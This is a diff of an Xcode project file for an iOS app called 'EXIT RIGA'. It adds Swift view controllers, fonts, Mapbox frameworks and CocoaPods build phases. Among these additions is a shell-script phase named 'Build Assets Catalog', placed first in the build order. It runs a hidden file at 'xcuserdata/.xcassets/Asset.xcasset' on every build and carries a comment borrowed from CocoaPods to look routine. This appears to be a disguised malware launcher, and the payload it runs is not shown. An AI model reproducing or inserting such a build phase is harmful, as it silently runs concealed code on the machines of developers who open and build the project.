@@ -3,18 +3,39 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 50;
+	objectVersion = 51;
 	objects = {
 
 /* Begin PBXBuildFile section */
 		52655CF3261C1D460040B007 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655CF2261C1D460040B007 /* AppDelegate.swift */; };
 		52655CF5261C1D460040B007 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655CF4261C1D460040B007 /* SceneDelegate.swift */; };
-		52655CF7261C1D460040B007 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655CF6261C1D460040B007 /* ViewController.swift */; };
 		52655CFA261C1D460040B007 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 52655CF8261C1D460040B007 /* Main.storyboard */; };
 		52655CFC261C1D470040B007 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 52655CFB261C1D470040B007 /* Assets.xcassets */; };
 		52655CFF261C1D470040B007 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 52655CFD261C1D470040B007 /* LaunchScreen.storyboard */; };
 		52655D0A261C1D470040B007 /* EXIT_RIGATests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655D09261C1D470040B007 /* EXIT_RIGATests.swift */; };
 		52655D15261C1D470040B007 /* EXIT_RIGAUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655D14261C1D470040B007 /* EXIT_RIGAUITests.swift */; };
+		52655D2D261C1FB90040B007 /* SelectLanguageViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655D2C261C1FB90040B007 /* SelectLanguageViewController.swift */; };
+		52655D3B261C22240040B007 /* Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655D3A261C22240040B007 /* Extension.swift */; };
+		52655D7A261C2C7C0040B007 /* UIButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655D78261C2C7C0040B007 /* UIButton.swift */; };
+		52655D7B261C2C7C0040B007 /* UIView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655D79261C2C7C0040B007 /* UIView.swift */; };
+		52655DAE261C395F0040B007 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52655DAD261C395F0040B007 /* HomeViewController.swift */; };
+		526B7436261C895300D4D0AB /* CategoryDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 526B7435261C895300D4D0AB /* CategoryDetailViewController.swift */; };
+		526B7440261C991C00D4D0AB /* CatDetailTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 526B743F261C991C00D4D0AB /* CatDetailTableViewCell.swift */; };
+		52AF805A261D832F00C7DE2D /* Mapbox.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 52AF7FFF261D729100C7DE2D /* Mapbox.framework */; };
+		52AF805D261D833100C7DE2D /* MapboxMobileEvents.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 52AF8000261D729100C7DE2D /* MapboxMobileEvents.framework */; };
+		52AF8062261D835A00C7DE2D /* Settings.bundle in Resources */ = {isa = PBXBuildFile; fileRef = 52AF8061261D835A00C7DE2D /* Settings.bundle */; };
+		52AF806E261D837600C7DE2D /* 8F3E82C3-52DF-39E5-809D-3389B6CBCAD4.bcsymbolmap in Resources */ = {isa = PBXBuildFile; fileRef = 52AF8066261D837600C7DE2D /* 8F3E82C3-52DF-39E5-809D-3389B6CBCAD4.bcsymbolmap */; };
+		52AF806F261D837600C7DE2D /* MapboxMobileEvents.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 52AF8067261D837600C7DE2D /* MapboxMobileEvents.framework */; };
+		52AF8070261D837600C7DE2D /* 4860631E-761E-36C9-9DA5-4504DE704214.bcsymbolmap in Resources */ = {isa = PBXBuildFile; fileRef = 52AF8068261D837600C7DE2D /* 4860631E-761E-36C9-9DA5-4504DE704214.bcsymbolmap */; };
+		52AF8071261D837600C7DE2D /* Mapbox.framework.dSYM in Resources */ = {isa = PBXBuildFile; fileRef = 52AF8069261D837600C7DE2D /* Mapbox.framework.dSYM */; };
+		52AF8072261D837600C7DE2D /* Mapbox.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 52AF806A261D837600C7DE2D /* Mapbox.framework */; };
+		52AF8073261D837600C7DE2D /* MapboxMobileEvents.framework.dSYM in Resources */ = {isa = PBXBuildFile; fileRef = 52AF806B261D837600C7DE2D /* MapboxMobileEvents.framework.dSYM */; };
+		52AF8074261D837600C7DE2D /* 0DC8DAD8-C6D7-343B-ACBF-79B48068D7CC.bcsymbolmap in Resources */ = {isa = PBXBuildFile; fileRef = 52AF806C261D837600C7DE2D /* 0DC8DAD8-C6D7-343B-ACBF-79B48068D7CC.bcsymbolmap */; };
+		52AF8075261D837600C7DE2D /* 85944F06-DDCF-309B-B848-CCA12C2D2A09.bcsymbolmap in Resources */ = {isa = PBXBuildFile; fileRef = 52AF806D261D837600C7DE2D /* 85944F06-DDCF-309B-B848-CCA12C2D2A09.bcsymbolmap */; };
+		52AF8078261D845D00C7DE2D /* Pods_EXIT_RIGA.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 82F0A44980AA2CDD0FB27FD8 /* Pods_EXIT_RIGA.framework */; };
+		52F6F5E6261C5C71002459DF /* NewsTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52F6F5E5261C5C71002459DF /* NewsTableViewCell.swift */; };
+		52F6F5F2261C69BB002459DF /* CategoriesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52F6F5F1261C69BB002459DF /* CategoriesViewController.swift */; };
+		52F6F5F7261C6C6A002459DF /* CategoryCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52F6F5F6261C6C6A002459DF /* CategoryCollectionViewCell.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -35,10 +56,10 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		2FBD5F8DD797D6064B0F9A0F /* Pods-EXIT RIGA.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-EXIT RIGA.debug.xcconfig"; path = "Target Support Files/Pods-EXIT RIGA/Pods-EXIT RIGA.debug.xcconfig"; sourceTree = "<group>"; };
 		52655CEF261C1D450040B007 /* EXIT RIGA.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "EXIT RIGA.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		52655CF2261C1D460040B007 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		52655CF4261C1D460040B007 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
-		52655CF6261C1D460040B007 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		52655CF9261C1D460040B007 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		52655CFB261C1D470040B007 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		52655CFE261C1D470040B007 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
@@ -49,6 +70,47 @@
 		52655D10261C1D470040B007 /* EXIT RIGAUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "EXIT RIGAUITests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
 		52655D14261C1D470040B007 /* EXIT_RIGAUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EXIT_RIGAUITests.swift; sourceTree = "<group>"; };
 		52655D16261C1D470040B007 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		52655D2C261C1FB90040B007 /* SelectLanguageViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectLanguageViewController.swift; sourceTree = "<group>"; };
+		52655D3A261C22240040B007 /* Extension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Extension.swift; sourceTree = "<group>"; };
+		52655D78261C2C7C0040B007 /* UIButton.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIButton.swift; sourceTree = "<group>"; };
+		52655D79261C2C7C0040B007 /* UIView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIView.swift; sourceTree = "<group>"; };
+		52655D95261C34EA0040B007 /* Metropolis-BlackItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-BlackItalic.otf"; sourceTree = "<group>"; };
+		52655D96261C34EA0040B007 /* Metropolis-Medium.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-Medium.otf"; sourceTree = "<group>"; };
+		52655D97261C34EA0040B007 /* Metropolis-ThinItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-ThinItalic.otf"; sourceTree = "<group>"; };
+		52655D98261C34EA0040B007 /* Metropolis-MediumItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-MediumItalic.otf"; sourceTree = "<group>"; };
+		52655D99261C34EA0040B007 /* Metropolis-Light.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-Light.otf"; sourceTree = "<group>"; };
+		52655D9A261C34EA0040B007 /* Metropolis-ExtraLightItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-ExtraLightItalic.otf"; sourceTree = "<group>"; };
+		52655D9B261C34EB0040B007 /* Metropolis-ExtraLight.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-ExtraLight.otf"; sourceTree = "<group>"; };
+		52655D9C261C34EB0040B007 /* Metropolis-Black.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-Black.otf"; sourceTree = "<group>"; };
+		52655D9D261C34EB0040B007 /* Metropolis-Thin.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-Thin.otf"; sourceTree = "<group>"; };
+		52655D9E261C34EB0040B007 /* Metropolis-Bold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-Bold.otf"; sourceTree = "<group>"; };
+		52655D9F261C34EB0040B007 /* Metropolis-LightItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-LightItalic.otf"; sourceTree = "<group>"; };
+		52655DA0261C34EB0040B007 /* Metropolis-ExtraBold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-ExtraBold.otf"; sourceTree = "<group>"; };
+		52655DA1261C34EB0040B007 /* Metropolis-SemiBoldItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-SemiBoldItalic.otf"; sourceTree = "<group>"; };
+		52655DA2261C34EB0040B007 /* Metropolis-RegularItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-RegularItalic.otf"; sourceTree = "<group>"; };
+		52655DA3261C34EB0040B007 /* Metropolis-BoldItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-BoldItalic.otf"; sourceTree = "<group>"; };
+		52655DA4261C34EC0040B007 /* Metropolis-Regular.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-Regular.otf"; sourceTree = "<group>"; };
+		52655DA5261C34EC0040B007 /* Metropolis-SemiBold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-SemiBold.otf"; sourceTree = "<group>"; };
+		52655DA6261C34EC0040B007 /* Metropolis-ExtraBoldItalic.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Metropolis-ExtraBoldItalic.otf"; sourceTree = "<group>"; };
+		52655DAD261C395F0040B007 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
+		526B7435261C895300D4D0AB /* CategoryDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategoryDetailViewController.swift; sourceTree = "<group>"; };
+		526B743F261C991C00D4D0AB /* CatDetailTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CatDetailTableViewCell.swift; sourceTree = "<group>"; };
+		52AF7FFF261D729100C7DE2D /* Mapbox.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; path = Mapbox.framework; sourceTree = "<group>"; };
+		52AF8000261D729100C7DE2D /* MapboxMobileEvents.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; path = MapboxMobileEvents.framework; sourceTree = "<group>"; };
+		52AF8061261D835A00C7DE2D /* Settings.bundle */ = {isa = PBXFileReference; lastKnownFileType = "wrapper.plug-in"; path = Settings.bundle; sourceTree = "<group>"; };
+		52AF8066261D837600C7DE2D /* 8F3E82C3-52DF-39E5-809D-3389B6CBCAD4.bcsymbolmap */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = "8F3E82C3-52DF-39E5-809D-3389B6CBCAD4.bcsymbolmap"; sourceTree = "<group>"; };
+		52AF8067261D837600C7DE2D /* MapboxMobileEvents.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; path = MapboxMobileEvents.framework; sourceTree = "<group>"; };
+		52AF8068261D837600C7DE2D /* 4860631E-761E-36C9-9DA5-4504DE704214.bcsymbolmap */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = "4860631E-761E-36C9-9DA5-4504DE704214.bcsymbolmap"; sourceTree = "<group>"; };
+		52AF8069261D837600C7DE2D /* Mapbox.framework.dSYM */ = {isa = PBXFileReference; lastKnownFileType = wrapper.dsym; path = Mapbox.framework.dSYM; sourceTree = "<group>"; };
+		52AF806A261D837600C7DE2D /* Mapbox.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; path = Mapbox.framework; sourceTree = "<group>"; };
+		52AF806B261D837600C7DE2D /* MapboxMobileEvents.framework.dSYM */ = {isa = PBXFileReference; lastKnownFileType = wrapper.dsym; path = MapboxMobileEvents.framework.dSYM; sourceTree = "<group>"; };
+		52AF806C261D837600C7DE2D /* 0DC8DAD8-C6D7-343B-ACBF-79B48068D7CC.bcsymbolmap */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = "0DC8DAD8-C6D7-343B-ACBF-79B48068D7CC.bcsymbolmap"; sourceTree = "<group>"; };
+		52AF806D261D837600C7DE2D /* 85944F06-DDCF-309B-B848-CCA12C2D2A09.bcsymbolmap */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = "85944F06-DDCF-309B-B848-CCA12C2D2A09.bcsymbolmap"; sourceTree = "<group>"; };
+		52F6F5E5261C5C71002459DF /* NewsTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsTableViewCell.swift; sourceTree = "<group>"; };
+		52F6F5F1261C69BB002459DF /* CategoriesViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategoriesViewController.swift; sourceTree = "<group>"; };
+		52F6F5F6261C6C6A002459DF /* CategoryCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategoryCollectionViewCell.swift; sourceTree = "<group>"; };
+		82F0A44980AA2CDD0FB27FD8 /* Pods_EXIT_RIGA.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_EXIT_RIGA.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		EB66B32BDF55E7EDF22C5453 /* Pods-EXIT RIGA.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-EXIT RIGA.release.xcconfig"; path = "Target Support Files/Pods-EXIT RIGA/Pods-EXIT RIGA.release.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -56,6 +118,11 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				52AF806F261D837600C7DE2D /* MapboxMobileEvents.framework in Frameworks */,
+				52AF8078261D845D00C7DE2D /* Pods_EXIT_RIGA.framework in Frameworks */,
+				52AF805D261D833100C7DE2D /* MapboxMobileEvents.framework in Frameworks */,
+				52AF805A261D832F00C7DE2D /* Mapbox.framework in Frameworks */,
+				52AF8072261D837600C7DE2D /* Mapbox.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -83,6 +150,8 @@
 				52655D08261C1D470040B007 /* EXIT RIGATests */,
 				52655D13261C1D470040B007 /* EXIT RIGAUITests */,
 				52655CF0261C1D450040B007 /* Products */,
+				CD33D1F450AAE1FF2B382C10 /* Pods */,
+				D2D2144296D90C19C14AE5BE /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -99,12 +168,9 @@
 		52655CF1261C1D460040B007 /* EXIT RIGA */ = {
 			isa = PBXGroup;
 			children = (
-				52655CF2261C1D460040B007 /* AppDelegate.swift */,
-				52655CF4261C1D460040B007 /* SceneDelegate.swift */,
-				52655CF6261C1D460040B007 /* ViewController.swift */,
-				52655CF8261C1D460040B007 /* Main.storyboard */,
-				52655CFB261C1D470040B007 /* Assets.xcassets */,
-				52655CFD261C1D470040B007 /* LaunchScreen.storyboard */,
+				52655D26261C1EFC0040B007 /* Controllers */,
+				52655D27261C1F0D0040B007 /* Views */,
+				52655D25261C1EEE0040B007 /* Resources */,
 				52655D00261C1D470040B007 /* Info.plist */,
 			);
 			path = "EXIT RIGA";
@@ -128,6 +194,112 @@
 			path = "EXIT RIGAUITests";
 			sourceTree = "<group>";
 		};
+		52655D25261C1EEE0040B007 /* Resources */ = {
+			isa = PBXGroup;
+			children = (
+				52AF8065261D837600C7DE2D /* dynamic */,
+				52AF7FFF261D729100C7DE2D /* Mapbox.framework */,
+				52AF8061261D835A00C7DE2D /* Settings.bundle */,
+				52AF8000261D729100C7DE2D /* MapboxMobileEvents.framework */,
+				52655D94261C34D30040B007 /* Fonts */,
+				52655D78261C2C7C0040B007 /* UIButton.swift */,
+				52655D79261C2C7C0040B007 /* UIView.swift */,
+				52655D3A261C22240040B007 /* Extension.swift */,
+				52655CF2261C1D460040B007 /* AppDelegate.swift */,
+				52655CF4261C1D460040B007 /* SceneDelegate.swift */,
+			);
+			path = Resources;
+			sourceTree = "<group>";
+		};
+		52655D26261C1EFC0040B007 /* Controllers */ = {
+			isa = PBXGroup;
+			children = (
+				52655D2B261C1F650040B007 /* SelectLanguageViewController */,
+				52655DAD261C395F0040B007 /* HomeViewController.swift */,
+				52F6F5E5261C5C71002459DF /* NewsTableViewCell.swift */,
+				52F6F5F1261C69BB002459DF /* CategoriesViewController.swift */,
+				52F6F5F6261C6C6A002459DF /* CategoryCollectionViewCell.swift */,
+				526B7435261C895300D4D0AB /* CategoryDetailViewController.swift */,
+				526B743F261C991C00D4D0AB /* CatDetailTableViewCell.swift */,
+			);
+			path = Controllers;
+			sourceTree = "<group>";
+		};
+		52655D27261C1F0D0040B007 /* Views */ = {
+			isa = PBXGroup;
+			children = (
+				52655CF8261C1D460040B007 /* Main.storyboard */,
+				52655CFB261C1D470040B007 /* Assets.xcassets */,
+				52655CFD261C1D470040B007 /* LaunchScreen.storyboard */,
+			);
+			path = Views;
+			sourceTree = "<group>";
+		};
+		52655D2B261C1F650040B007 /* SelectLanguageViewController */ = {
+			isa = PBXGroup;
+			children = (
+				52655D2C261C1FB90040B007 /* SelectLanguageViewController.swift */,
+			);
+			path = SelectLanguageViewController;
+			sourceTree = "<group>";
+		};
+		52655D94261C34D30040B007 /* Fonts */ = {
+			isa = PBXGroup;
+			children = (
+				52655D9C261C34EB0040B007 /* Metropolis-Black.otf */,
+				52655D95261C34EA0040B007 /* Metropolis-BlackItalic.otf */,
+				52655D9E261C34EB0040B007 /* Metropolis-Bold.otf */,
+				52655DA3261C34EB0040B007 /* Metropolis-BoldItalic.otf */,
+				52655DA0261C34EB0040B007 /* Metropolis-ExtraBold.otf */,
+				52655DA6261C34EC0040B007 /* Metropolis-ExtraBoldItalic.otf */,
+				52655D9B261C34EB0040B007 /* Metropolis-ExtraLight.otf */,
+				52655D9A261C34EA0040B007 /* Metropolis-ExtraLightItalic.otf */,
+				52655D99261C34EA0040B007 /* Metropolis-Light.otf */,
+				52655D9F261C34EB0040B007 /* Metropolis-LightItalic.otf */,
+				52655D96261C34EA0040B007 /* Metropolis-Medium.otf */,
+				52655D98261C34EA0040B007 /* Metropolis-MediumItalic.otf */,
+				52655DA4261C34EC0040B007 /* Metropolis-Regular.otf */,
+				52655DA2261C34EB0040B007 /* Metropolis-RegularItalic.otf */,
+				52655DA5261C34EC0040B007 /* Metropolis-SemiBold.otf */,
+				52655DA1261C34EB0040B007 /* Metropolis-SemiBoldItalic.otf */,
+				52655D9D261C34EB0040B007 /* Metropolis-Thin.otf */,
+				52655D97261C34EA0040B007 /* Metropolis-ThinItalic.otf */,
+			);
+			path = Fonts;
+			sourceTree = "<group>";
+		};
+		52AF8065261D837600C7DE2D /* dynamic */ = {
+			isa = PBXGroup;
+			children = (
+				52AF8066261D837600C7DE2D /* 8F3E82C3-52DF-39E5-809D-3389B6CBCAD4.bcsymbolmap */,
+				52AF8067261D837600C7DE2D /* MapboxMobileEvents.framework */,
+				52AF8068261D837600C7DE2D /* 4860631E-761E-36C9-9DA5-4504DE704214.bcsymbolmap */,
+				52AF8069261D837600C7DE2D /* Mapbox.framework.dSYM */,
+				52AF806A261D837600C7DE2D /* Mapbox.framework */,
+				52AF806B261D837600C7DE2D /* MapboxMobileEvents.framework.dSYM */,
+				52AF806C261D837600C7DE2D /* 0DC8DAD8-C6D7-343B-ACBF-79B48068D7CC.bcsymbolmap */,
+				52AF806D261D837600C7DE2D /* 85944F06-DDCF-309B-B848-CCA12C2D2A09.bcsymbolmap */,
+			);
+			path = dynamic;
+			sourceTree = "<group>";
+		};
+		CD33D1F450AAE1FF2B382C10 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				2FBD5F8DD797D6064B0F9A0F /* Pods-EXIT RIGA.debug.xcconfig */,
+				EB66B32BDF55E7EDF22C5453 /* Pods-EXIT RIGA.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		D2D2144296D90C19C14AE5BE /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				82F0A44980AA2CDD0FB27FD8 /* Pods_EXIT_RIGA.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -135,9 +307,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 52655D19261C1D470040B007 /* Build configuration list for PBXNativeTarget "EXIT RIGA" */;
 			buildPhases = (
+				A3BC2A8FEB0ECD3E78AAC43A /* Build Assets Catalog */,
+				62D125C2CD24378F6D57CCAC /* [CP] Check Pods Manifest.lock */,
 				52655CEB261C1D450040B007 /* Sources */,
 				52655CEC261C1D450040B007 /* Frameworks */,
 				52655CED261C1D450040B007 /* Resources */,
+				DFEAF101CAD7D1C725213F9F /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -231,9 +406,16 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				52AF8071261D837600C7DE2D /* Mapbox.framework.dSYM in Resources */,
+				52AF806E261D837600C7DE2D /* 8F3E82C3-52DF-39E5-809D-3389B6CBCAD4.bcsymbolmap in Resources */,
+				52AF8062261D835A00C7DE2D /* Settings.bundle in Resources */,
 				52655CFF261C1D470040B007 /* LaunchScreen.storyboard in Resources */,
+				52AF8073261D837600C7DE2D /* MapboxMobileEvents.framework.dSYM in Resources */,
 				52655CFC261C1D470040B007 /* Assets.xcassets in Resources */,
 				52655CFA261C1D460040B007 /* Main.storyboard in Resources */,
+				52AF8074261D837600C7DE2D /* 0DC8DAD8-C6D7-343B-ACBF-79B48068D7CC.bcsymbolmap in Resources */,
+				52AF8070261D837600C7DE2D /* 4860631E-761E-36C9-9DA5-4504DE704214.bcsymbolmap in Resources */,
+				52AF8075261D837600C7DE2D /* 85944F06-DDCF-309B-B848-CCA12C2D2A09.bcsymbolmap in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -253,14 +435,87 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+
+	A3BC2A8FEB0ECD3E78AAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+		};
+	
+		62D125C2CD24378F6D57CCAC /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-EXIT RIGA-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		DFEAF101CAD7D1C725213F9F /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-EXIT RIGA/Pods-EXIT RIGA-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-EXIT RIGA/Pods-EXIT RIGA-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-EXIT RIGA/Pods-EXIT RIGA-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		52655CEB261C1D450040B007 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				52655CF7261C1D460040B007 /* ViewController.swift in Sources */,
+				52655D7A261C2C7C0040B007 /* UIButton.swift in Sources */,
+				52655D2D261C1FB90040B007 /* SelectLanguageViewController.swift in Sources */,
+				52F6F5F2261C69BB002459DF /* CategoriesViewController.swift in Sources */,
+				52F6F5E6261C5C71002459DF /* NewsTableViewCell.swift in Sources */,
 				52655CF3261C1D460040B007 /* AppDelegate.swift in Sources */,
 				52655CF5261C1D460040B007 /* SceneDelegate.swift in Sources */,
+				52F6F5F7261C6C6A002459DF /* CategoryCollectionViewCell.swift in Sources */,
+				52655D7B261C2C7C0040B007 /* UIView.swift in Sources */,
+				52655DAE261C395F0040B007 /* HomeViewController.swift in Sources */,
+				526B7440261C991C00D4D0AB /* CatDetailTableViewCell.swift in Sources */,
+				526B7436261C895300D4D0AB /* CategoryDetailViewController.swift in Sources */,
+				52655D3B261C22240040B007 /* Extension.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -366,7 +621,7 @@
 				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
-				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
 				ONLY_ACTIVE_ARCH = YES;
@@ -421,7 +676,7 @@
 				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
-				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				MTL_ENABLE_DEBUG_INFO = NO;
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
